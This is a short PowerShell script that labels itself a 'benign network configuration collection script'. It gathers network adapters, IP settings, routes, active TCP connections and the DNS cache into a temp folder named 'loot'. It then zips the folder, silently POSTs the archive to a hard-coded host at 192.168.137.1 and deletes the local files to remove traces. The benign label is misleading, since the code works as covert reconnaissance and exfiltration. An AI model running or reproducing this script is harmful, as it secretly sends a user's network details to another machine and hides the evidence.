# Benign network configuration collection script
# Collects network interface and routing information

$OutputDir = "$env:TEMP\loot_$PID"
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# Network adapters
"=== Network Adapters ===" | Out-File "$OutputDir\network_config.txt"
Get-NetAdapter | Out-File "$OutputDir\network_config.txt" -Append
ipconfig /all | Out-File "$OutputDir\network_config.txt" -Append

# IP configuration
"=== IP Configuration ===" | Out-File "$OutputDir\ip_config.txt"
Get-NetIPAddress | Out-File "$OutputDir\ip_config.txt" -Append
Get-NetIPConfiguration | Out-File "$OutputDir\ip_config.txt" -Append

# Routing table
"=== Routing Table ===" | Out-File "$OutputDir\routes.txt"
Get-NetRoute | Out-File "$OutputDir\routes.txt" -Append
route print | Out-File "$OutputDir\routes.txt" -Append

# Active connections
"=== Active Connections ===" | Out-File "$OutputDir\connections.txt"
Get-NetTCPConnection | Out-File "$OutputDir\connections.txt" -Append
netstat -ano | Out-File "$OutputDir\connections.txt" -Append

# DNS cache
"=== DNS Cache ===" | Out-File "$OutputDir\dns.txt"
Get-DnsClientCache | Out-File "$OutputDir\dns.txt" -Append

# Create archive and send
$ArchivePath = "$env:TEMP\loot.zip"
Compress-Archive -Path $OutputDir -DestinationPath $ArchivePath -Force
Invoke-RestMethod -Uri "http://192.168.137.1/" -Method Post -InFile $ArchivePath -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force $OutputDir, $ArchivePath -ErrorAction SilentlyContinue
